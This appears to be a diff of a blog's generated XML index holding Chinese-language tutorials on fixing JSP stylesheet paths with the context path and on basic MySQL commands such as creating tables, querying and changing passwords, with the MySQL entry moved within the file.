+        <content type="html"><![CDATA[<h3 id="问题简介"><a href="#问题简介" class="headerlink" title="问题简介"></a>问题简介</h3><p>当使用重定向转发时发现跳转后的界面失去了布局样式，这种情况一般是路径问题。<br>当在jsp中引入css时，如果其相对路径相对于当前jsp文件的，而在一个和这个jsp的路径不一样的servlet中forward这个jsp时，就会发现这个css样式根本没有起作用。</p><p>这是因为在servlet中转发时css的路径就是相对于这个servlet的相对路径而非jsp的路径了。</p><p>所以这时候不能在jsp中用这样的路径：</p><p><link href="one.css" rel="stylesheet" type="text/css"><br>或者</p><p><link href="../../one.css" rel="stylesheet" type="text/css"></p><h4 id="在css-js的路径前加-pageContext-request-contextPath-，就可以了"><a href="#在css-js的路径前加-pageContext-request-contextPath-，就可以了" class="headerlink" title="在css/js的路径前加${pageContext.request.contextPath}，就可以了"></a>在css/js的路径前加${pageContext.request.contextPath}，就可以了</h4><p>${pageContext.request.contextPath}是JSP取得绝对路径的方法，等价于&lt;%=request.getContextPath()%&gt; 。<br>也就是取出部署的应用程序名或者是当前的项目名称</p><p>比如我的项目名称是demo1在浏览器中输入为<a href="http://localhost:8080/demo1/a.jsp" target="_blank" rel="noopener">http://localhost:8080/demo1/a.jsp</a> ${pageContext.request.contextPath}或&lt;%=request.getContextPath()%&gt;取出来的就是/demo1,而”/“代表的含义就是<a href="http://localhost:8080" target="_blank" rel="noopener">http://localhost:8080</a></p><p>故有时候项目中这样写${pageContext.request.contextPath}/a.jsp</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 样式 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JS </tag>
             
             <tag> CSS </tag>
             
@@ -1584,9 +1665,36 @@
       
         <tags>
             
+            <tag> JBDC </tag>
+            
             <tag> SQL </tag>
             
-            <tag> JBDC </tag>
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MySQL入门</title>
+      <link href="/2019/08/06/web/mysql2/"/>
+      <url>/2019/08/06/web/mysql2/</url>
+      
+        <content type="html"><![CDATA[<h3 id="MySQL的数据库创建、删除"><a href="#MySQL的数据库创建、删除" class="headerlink" title="MySQL的数据库创建、删除"></a>MySQL的数据库创建、删除</h3><p>下面为MySQL操作成功例子，相关命令我会放在本文档后面<br>1.首先，以管理员身份启动dos命令界面，切盘到MySQL的bin目录下<br><img src="http://img.ahdy.top/2019-08-06_133616.png" alt><br>2.启动MySQL服务，登陆MySQL<br><img src="http://img.ahdy.top/2019-08-06_134251.png" alt><br>3.输入<code>show databases;</code>显示MySQL当中的数据库，这些初始化的数据库，切记不可以动，它们关系着MySQL的功能是否正常运行！接着，输入了<code>create database firstdemo;</code>就成功新创建了一个数据库<br>当然也可以初始化创建数据库时对数据库的编码进行指定<br>输入<code>create database firstdemo2 character set gbk/utf8;</code>就能创建一个指定字符集编码的数据库  </p><h5 id="指定数据库编码有什么用？"><a href="#指定数据库编码有什么用？" class="headerlink" title="指定数据库编码有什么用？"></a>指定数据库编码有什么用？</h5><p>当外界数据编码于数据库编码不一致的时，数据传入进数据库里就会产生乱码，这也是最常见的问题之一！<br><img src="http://img.ahdy.top/2019-08-06_134511.png" alt><br>4.查看数据库字符集输入<code>show create database firstdemo;</code>删除数据库输入<code>drop database firstdemo;</code>之后发现firstdemo已经被删除<br><img src="http://img.ahdy.top/2019-08-06_142216.png" alt>  </p><h3 id="数据库的使用"><a href="#数据库的使用" class="headerlink" title="数据库的使用"></a>数据库的使用</h3><p>首先创建一个数据库然后建表,注意一定先use +数据库名才能使用建表命令，不然会报错!<br><img src="http://img.ahdy.top/2019-08-06_154548.png" alt></p><h3 id="MySQL常用SQL命令："><a href="#MySQL常用SQL命令：" class="headerlink" title="MySQL常用SQL命令："></a>MySQL常用SQL命令：</h3><h4 id="数据库相关SQL"><a href="#数据库相关SQL" class="headerlink" title="数据库相关SQL"></a>数据库相关SQL</h4><pre><code>1.查看所有数据库    show databases;2.创建数据库    -格式：create    database 数据库名    create database newdb1;    创建数据库并且指定字符集    create database newdb1 character set gbk/utf8;3.查看数据库的详情 可以查看数据库的字符集。    show create database 数据库名。    show create database newdb1;4.删除数据库    --格式：drop database 数据库名    drop database newdb2;5.使用数据库    use newdb1;#### 表相关的操作1.查看所有表    show tables;2.创建表    --格式：create table 表名(字段1 字段1 类型，字段2，字段2类型);    create table person(name varchar(10),age int);3.查看详情    show create table person;    --数据库表引擎    1.InnoDB:支持数据库的高级操作，比如：事物，外键，索引，约束等等。    2.myisam:不支持数据库的高级操作，只支持基础的增删改查。4.创建表指定引擎和字符集。    --格式：create table 表名(字段1 字段1 类型，字段2，字段2类型)engine=innodb/myisam charset=gbk/utf8;    create table t1(name varchar(10),age int)engine=innodb charset=gbk;5.查看表字段    desc t1;6.删除表    drop table t1;#### 数据相关的SQL create table hero(name varchar(10),age int);--全表插入格式：insert into 表名 values(值1,值2);insert into hero values(&#39;刘备&#39;,18);--指定字段插入    insert into hero(name) values(&#39;李白&#39;);--批量插入数据：insert into hero values(&#39;关羽&#39;,18),(&#39;张飞&#39;,18);insert into hero(name) values(&#39;李白&#39;),(&#39;白居易&#39;),(&#39;杜甫&#39;);### 查询数据    --格式：select 字段信息 from 表名 where 条件。1.查询所有数据，所有字段信息。    select * from hero;2.查询所有的名字.    select name from hero;3.查询年龄18岁人的所有信息。    seelct * from hero where age = 18;### 修改数据    --格式：update 表名 set 字段名=数据 where 过滤条件=数据.    update hero set age=25 where name=&#39;刘备&#39;;    --注意：如果不给条件则修改全表信息。### 删除数据    delete from 表名 where 条件。    delete from hero where name=&#39;杜甫&#39;;    delete from hero;  </code></pre><h3 id="MySQL常见问题汇总"><a href="#MySQL常见问题汇总" class="headerlink" title="MySQL常见问题汇总"></a>MySQL常见问题汇总</h3><h4 id="1-修改密码时，无法修改，发送异常信息"><a href="#1-修改密码时，无法修改，发送异常信息" class="headerlink" title="1.修改密码时，无法修改，发送异常信息"></a>1.修改密码时，无法修改，发送异常信息</h4><p>报错信息如下：</p><p>ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that<br>corresponds to your MySQL server version for the right syntax to use near ‘(‘123<br>456’) where user=’root’’ at line 1</p><p>看过很多方法：</p><p> 总结如下：</p><p> 使用win+R 输入CMD进入dos界面。进入你的mysql安装路径下面的bin文件家里面；</p><p>先使用：mysql -u root -p 输入密码进入mysql命令窗口mysql&gt;:</p><p>修改密码：</p><p>方法1：</p><pre><code>     set password for 用户名@localhost=password(&#39;新密码&#39;)；</code></pre><p>方法2：</p><pre><code>    mysql&gt;set password =password(&#39;你的密码&#39;);    mysql&gt;flush privileges;</code></pre><p>方法3：</p><pre><code>   ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;123456&#39;;（我采用的是这个方式进行密码修改的，前两种仍然报错）；</code></pre><h4 id="2-MySQL服务无法启动成功，服务没有报错"><a href="#2-MySQL服务无法启动成功，服务没有报错" class="headerlink" title="2.MySQL服务无法启动成功，服务没有报错"></a>2.MySQL服务无法启动成功，服务没有报错</h4><p>这种情况分为多种可能：<br>1.没有配置好ini文件<br>2.MySQL文件夹下没有date目录<br>3.系统内存在多个不同版本的MySQL服务，并且服务在运行中<br>4.端口占用<br>这些潜在问题可能不会在启动SQL时发生，我建议，在发生未知错误时推到重新来，如果你实在装不好，可以加我QQ联系，我远程给你ko！ok？嗯，下一篇—MySQL进阶。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> MySQL </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL </tag>
+            
+            <tag> MySQL </tag>
             
         </tags>
       
@@ -1614,33 +1722,6 @@
             <tag> 服务器 </tag>
             
             <tag> Tomcat </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>MySQL入门</title>
-      <link href="/2019/08/06/web/mysql2/"/>
-      <url>/2019/08/06/web/mysql2/</url>
-      
-        <content type="html"><![CDATA[<h3 id="MySQL的数据库创建、删除"><a href="#MySQL的数据库创建、删除" class="headerlink" title="MySQL的数据库创建、删除"></a>MySQL的数据库创建、删除</h3><p>下面为MySQL操作成功例子，相关命令我会放在本文档后面<br>1.首先，以管理员身份启动dos命令界面，切盘到MySQL的bin目录下<br><img src="http://img.ahdy.top/2019-08-06_133616.png" alt><br>2.启动MySQL服务，登陆MySQL<br><img src="http://img.ahdy.top/2019-08-06_134251.png" alt><br>3.输入<code>show databases;</code>显示MySQL当中的数据库，这些初始化的数据库，切记不可以动，它们关系着MySQL的功能是否正常运行！接着，输入了<code>create database firstdemo;</code>就成功新创建了一个数据库<br>当然也可以初始化创建数据库时对数据库的编码进行指定<br>输入<code>create database firstdemo2 character set gbk/utf8;</code>就能创建一个指定字符集编码的数据库  </p><h5 id="指定数据库编码有什么用？"><a href="#指定数据库编码有什么用？" class="headerlink" title="指定数据库编码有什么用？"></a>指定数据库编码有什么用？</h5><p>当外界数据编码于数据库编码不一致的时，数据传入进数据库里就会产生乱码，这也是最常见的问题之一！<br><img src="http://img.ahdy.top/2019-08-06_134511.png" alt><br>4.查看数据库字符集输入<code>show create database firstdemo;</code>删除数据库输入<code>drop database firstdemo;</code>之后发现firstdemo已经被删除<br><img src="http://img.ahdy.top/2019-08-06_142216.png" alt>  </p><h3 id="数据库的使用"><a href="#数据库的使用" class="headerlink" title="数据库的使用"></a>数据库的使用</h3><p>首先创建一个数据库然后建表,注意一定先use +数据库名才能使用建表命令，不然会报错!<br><img src="http://img.ahdy.top/2019-08-06_154548.png" alt></p><h3 id="MySQL常用SQL命令："><a href="#MySQL常用SQL命令：" class="headerlink" title="MySQL常用SQL命令："></a>MySQL常用SQL命令：</h3><h4 id="数据库相关SQL"><a href="#数据库相关SQL" class="headerlink" title="数据库相关SQL"></a>数据库相关SQL</h4><pre><code>1.查看所有数据库    show databases;2.创建数据库    -格式：create    database 数据库名    create database newdb1;    创建数据库并且指定字符集    create database newdb1 character set gbk/utf8;3.查看数据库的详情 可以查看数据库的字符集。    show create database 数据库名。    show create database newdb1;4.删除数据库    --格式：drop database 数据库名    drop database newdb2;5.使用数据库    use newdb1;#### 表相关的操作1.查看所有表    show tables;2.创建表    --格式：create table 表名(字段1 字段1 类型，字段2，字段2类型);    create table person(name varchar(10),age int);3.查看详情    show create table person;    --数据库表引擎    1.InnoDB:支持数据库的高级操作，比如：事物，外键，索引，约束等等。    2.myisam:不支持数据库的高级操作，只支持基础的增删改查。4.创建表指定引擎和字符集。    --格式：create table 表名(字段1 字段1 类型，字段2，字段2类型)engine=innodb/myisam charset=gbk/utf8;    create table t1(name varchar(10),age int)engine=innodb charset=gbk;5.查看表字段    desc t1;6.删除表    drop table t1;#### 数据相关的SQL create table hero(name varchar(10),age int);--全表插入格式：insert into 表名 values(值1,值2);insert into hero values(&#39;刘备&#39;,18);--指定字段插入    insert into hero(name) values(&#39;李白&#39;);--批量插入数据：insert into hero values(&#39;关羽&#39;,18),(&#39;张飞&#39;,18);insert into hero(name) values(&#39;李白&#39;),(&#39;白居易&#39;),(&#39;杜甫&#39;);### 查询数据    --格式：select 字段信息 from 表名 where 条件。1.查询所有数据，所有字段信息。    select * from hero;2.查询所有的名字.    select name from hero;3.查询年龄18岁人的所有信息。    seelct * from hero where age = 18;### 修改数据    --格式：update 表名 set 字段名=数据 where 过滤条件=数据.    update hero set age=25 where name=&#39;刘备&#39;;    --注意：如果不给条件则修改全表信息。### 删除数据    delete from 表名 where 条件。    delete from hero where name=&#39;杜甫&#39;;    delete from hero;  </code></pre><h3 id="MySQL常见问题汇总"><a href="#MySQL常见问题汇总" class="headerlink" title="MySQL常见问题汇总"></a>MySQL常见问题汇总</h3><h4 id="1-修改密码时，无法修改，发送异常信息"><a href="#1-修改密码时，无法修改，发送异常信息" class="headerlink" title="1.修改密码时，无法修改，发送异常信息"></a>1.修改密码时，无法修改，发送异常信息</h4><p>报错信息如下：</p><p>ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that<br>corresponds to your MySQL server version for the right syntax to use near ‘(‘123<br>456’) where user=’root’’ at line 1</p><p>看过很多方法：</p><p> 总结如下：</p><p> 使用win+R 输入CMD进入dos界面。进入你的mysql安装路径下面的bin文件家里面；</p><p>先使用：mysql -u root -p 输入密码进入mysql命令窗口mysql&gt;:</p><p>修改密码：</p><p>方法1：</p><pre><code>     set password for 用户名@localhost=password(&#39;新密码&#39;)；</code></pre><p>方法2：</p><pre><code>    mysql&gt;set password =password(&#39;你的密码&#39;);    mysql&gt;flush privileges;</code></pre><p>方法3：</p><pre><code>   ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;123456&#39;;（我采用的是这个方式进行密码修改的，前两种仍然报错）；</code></pre><h4 id="2-MySQL服务无法启动成功，服务没有报错"><a href="#2-MySQL服务无法启动成功，服务没有报错" class="headerlink" title="2.MySQL服务无法启动成功，服务没有报错"></a>2.MySQL服务无法启动成功，服务没有报错</h4><p>这种情况分为多种可能：<br>1.没有配置好ini文件<br>2.MySQL文件夹下没有date目录<br>3.系统内存在多个不同版本的MySQL服务，并且服务在运行中<br>4.端口占用<br>这些潜在问题可能不会在启动SQL时发生，我建议，在发生未知错误时推到重新来，如果你实在装不好，可以加我QQ联系，我远程给你ko！ok？嗯，下一篇—MySQL进阶。</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> MySQL </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> MySQL </tag>
-            
-            <tag> SQL </tag>
             
         </tags>
       
